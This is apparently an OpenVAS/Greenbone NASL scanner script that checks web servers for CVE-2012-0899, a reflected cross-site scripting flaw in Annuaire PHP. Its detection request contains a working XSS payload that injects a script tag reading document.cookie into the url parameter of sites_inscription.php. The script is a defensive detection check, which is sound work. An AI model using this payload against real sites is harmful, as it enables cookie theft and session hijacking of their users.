# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902787");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2012-01-24 18:49:12 +0530 (Tue, 24 Jan 2012)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_cve_id("CVE-2012-0899");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Annuaire PHP XSS Vulnerability (Jan 2012) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Annuaire PHP is prone to a cross-site scripting (XSS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to an input passed via the 'url' and 'nom'
  parameters to 'sites_inscription.php' page is not properly verified before it is returned to the
  user.");

  script_tag(name:"impact", value:"Successful exploitation will allow the attackers to execute
  arbitrary HTML and script code in a user's browser session in the context of a vulnerable site.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/72407");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51434");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/108719/annuaire-xss.txt");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

if (!http_can_host_php(port: port))
  exit(0);

foreach dir (make_list_unique("/", "/annuaire", "/Annuaire", http_cgi_dirs(port: port))) {

  if (dir == "/")
    dir = "";

  res = http_get_cache(port: port, item: dir + "/admin/index.php");

  if (">Annuaire" >< res || "annuaire<" >< res) {
    url = dir + "/referencement/sites_inscription.php?nom=xss&url=><script>alert(document.cookie)</script>";

    if (http_vuln_check(port: port, url: url, pattern: "<script>alert\(document.cookie\)</script>",
                        extra_check: make_list("<title>Annuaire", "compte_annu.php"), check_header: TRUE)) {
      report = http_report_vuln_url(port: port, url: url);
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(99);
